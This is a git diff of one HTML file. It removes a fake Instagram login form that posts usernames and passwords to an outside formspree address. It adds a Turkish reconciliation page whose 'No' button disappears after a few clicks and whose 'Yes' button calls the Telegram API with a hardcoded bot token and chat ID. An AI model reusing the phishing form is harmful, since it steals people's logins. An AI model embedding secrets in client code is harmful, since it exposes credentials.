@@ -1,20 +1,126 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Instagram</title>
-  <link rel="stylesheet" href="style.css" />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Barışalım mı, Zehra?</title>
+<style>
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    background: #fff0f6;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    user-select: none;
+    position: relative;
+  }
+  h1 {
+    color: #c2185b;
+    margin-bottom: 20px;
+  }
+  button {
+    font-size: 24px;
+    padding: 15px 40px;
+    margin: 0 10px;
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    background: #f48fb1;
+    color: white;
+    box-shadow: 0 4px 15px rgba(196,24,91,0.6);
+    transition: transform 0.3s ease;
+  }
+  button:active {
+    transform: scale(0.95);
+  }
+  #yes {
+    font-weight: bold;
+  }
+  #no {
+    font-weight: normal;
+  }
+  #message {
+    margin-top: 25px;
+    font-size: 22px;
+    color: #880e4f;
+    font-weight: bold;
+  }
+  /* Kalpler */
+  .heart {
+    position: fixed;
+    width: 30px;
+    height: 30px;
+    background: url("data:image/svg+xml,%3csvg viewBox='0 0 24 24' fill='%23ff4081' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41 0.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z'/%3e%3c/svg%3e") no-repeat center/contain;
+    pointer-events: none;
+    animation: floatUp 4s linear infinite;
+  }
+  @keyframes floatUp {
+    0% { transform: translateY(100vh) scale(1); opacity: 1;}
+    100% { transform: translateY(-10vh) scale(0.5); opacity: 0;}
+  }
+</style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" class="logo" alt="Instagram Logo" />
-    <form action="https://formspree.io/f/xzzeljgl" method="POST">
-      <input type="text" name="username" placeholder="Phone number, username, or email" required />
-      <input type="password" name="password" placeholder="Password" required />
-      <button type="submit">Log In</button>
-    </form>
-  </div>
+
+<h1>Barışalım mı, Zehra?</h1>
+<div id="buttons">
+  <button id="yes">Evet</button>
+  <button id="no">Hayır</button>
+</div>
+<div id="message"></div>
+
+<script>
+  const yesBtn = document.getElementById("yes");
+  const noBtn = document.getElementById("no");
+  const messageDiv = document.getElementById("message");
+  let noClicks = 0;
+
+  noBtn.addEventListener("click", () => {
+    noClicks++;
+    if (noClicks <= 3) {
+      yesBtn.style.transform = `scale(${1 + noClicks * 0.25})`;
+    }
+    if (noClicks >= 4) {
+      noBtn.style.display = "none";
+    }
+  });
+
+  yesBtn.addEventListener("click", async () => {
+    // Telegram bot API çağrısı
+    const BOT_TOKEN = "7996559452:AAFUZHzo4URmpsKOXVemh5EkLWvzv-BWQTg";
+    const CHAT_ID = "279052247";
+    const text = encodeURIComponent("Zehra evet dedi 💞");
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
+
+    try {
+      await fetch(url);
+      // Butonları gizle, mesaj göster
+      document.getElementById("buttons").style.display = "none";
+      messageDiv.textContent = "Zehra, gözlerin gerçekten çok güzel... 💖";
+    } catch (error) {
+      alert("Mesaj gönderilirken bir hata oluştu.");
+      console.error(error);
+    }
+  });
+
+  // Arka planda pembe kalpler uçuşuyor
+  function createHeart() {
+    const heart = document.createElement("div");
+    heart.className = "heart";
+    heart.style.left = Math.random() * window.innerWidth + "px";
+    heart.style.animationDuration = 3 + Math.random() * 2 + "s";
+    heart.style.opacity = Math.random();
+    document.body.appendChild(heart);
+    setTimeout(() => {
+      heart.remove();
+    }, 5000);
+  }
+
+  setInterval(createHeart, 300);
+</script>
+
 </body>
 </html>
